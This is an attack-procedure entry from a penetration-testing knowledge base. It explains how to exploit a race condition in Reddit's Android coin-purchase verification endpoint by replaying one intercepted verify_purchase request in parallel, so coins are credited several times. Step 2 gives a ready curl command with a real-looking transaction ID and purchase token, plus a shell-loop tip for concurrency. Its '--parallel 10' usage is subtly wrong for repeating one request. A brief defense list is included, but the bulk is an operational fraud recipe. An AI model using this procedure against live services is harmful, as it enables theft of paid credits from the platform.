---
tags:
  - race-condition
  - replay
  - parallel
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/reddit-verify-purchase-replay]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:22.523Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 19effa20-c159-4716-b5d3-d1702cf483d9
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Replay-Verification-Request-in-Parallel

## Summary

This procedure replays the intercepted purchase verification request multiple times concurrently to exploit a memcache TOCTOU race condition, crediting coins repeatedly.

## Description

The endpoint lacks proper locking for concurrent requests, allowing multiple validations before memcache locks the transaction. Using the captured request, send 10+ parallel POSTs. Targets Reddit's OAuth API; requires auth headers from session. Expected outcome: Inflated coin balance (e.g., 9x credits).

## Requirements

1. Intercepted request details (token, IDs)
2. Valid Reddit session (Bearer token)
3. Tool for concurrent HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement atomic transactions with database locks instead of memcache
- Rate-limit verification endpoints and detect concurrent bursts
- Idempotency keys on requests

## Objectives

1. Send concurrent requests to bypass locking
2. Achieve multiple successful credits
3. Validate inflation in app balance

## Instructions

### Step 1: Prepare Request Data

**Context**: Format the intercepted request for replay.

Copy parameters from Burp: transaction_id, token, etc., into a postdata file.

> Ensures exact replication.

### Step 2: Execute Parallel Requests

**Context**: Fire multiple concurrent POSTs to exploit race.

**Command** ([[commands/reddit-verify-purchase-replay]]):
```bash
curl -X POST 'https://oauth.reddit.com/api/v2/gold/android/verify_purchase?raw_json=1' \
  -H 'Authorization: Bearer REDACTED' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd' \
  --parallel 10  # Use xargs or ab for true parallelism
```

> For parallelism, wrap in a script: for i in {1..10}; do curl ... & done. Expected: Most requests return 200 with credit confirmation.

### Step 3: Verify Inflation

**Context**: Check app balance post-replay.

Refresh Reddit app coin balance.

> Success: Balance shows multiple 50-coin additions.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/reddit-verify-purchase-replay]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- race-condition
- replay
